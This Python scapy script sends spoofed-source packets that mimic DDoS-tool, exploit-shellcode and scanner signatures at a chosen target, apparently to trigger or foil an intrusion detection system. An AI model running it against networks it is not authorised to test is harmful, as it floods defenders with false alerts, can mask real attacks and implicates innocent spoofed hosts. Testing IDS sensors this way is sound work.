import argparse
from scapy.all import send, Raw
from scapy.layers.inet import IP, UDP, ICMP
from random import randint


def ddos_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / ICMP(type=8, id=678) / Raw(load='1234')
    send(pkt, iface=iface, count=count)

    pkt = IP(src=src, dst=dst) / ICMP(type=0) / Raw(load='AAAAAAAAAA')
    send(pkt, iface=iface, count=count)

    pkt = IP(src=src, dst=dst) / UDP(dport=31335) / Raw(load='PONG')
    send(pkt, iface=iface, count=count)

    pkt = IP(src=src, dst=dst) / ICMP(type=0, id=456)
    send(pkt, iface=iface, count=count)


def exploit_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) \
          / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)

    pkt = IP(src=src, dst=dst) / UDP(dport=635) \
          / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)


def scan_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=7) / Raw(load='cybercop')
    send(pkt)

    pkt = IP(src=src, dst=dst) / UDP(dport=10080) / Raw(load='Amanda')
    send(pkt, iface=iface, count=count)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 ids_foil.py -t TARGET [-i IFACE] [-s SRC] [-c COUNT]')
    parser.add_argument('dst', type=str, metavar='TARGET',
                        help='specify the target address for the attack')
    parser.add_argument('-i', type=str, metavar='IFACE',
                        default='eth0', help='specify the network interface')
    def_src = '.'.join([str(randint(1, 254)) for x in range(4)])
    parser.add_argument('-s', type=str, metavar='SRC', default=def_src,
                        help='specify the spoofed source address of the attack')
    parser.add_argument('-c', type=int, metavar='COUNT', default=1,
                        help='specify the packet count')

    args = parser.parse_args()
    _dst = args.dst
    _iface = args.i
    _src = args.s
    _count = args.c

    ddos_test(_src, _dst, _iface, _count)
    exploit_test(_src, _dst, _iface, _count)
    scan_test(_src, _dst, _iface, _count)
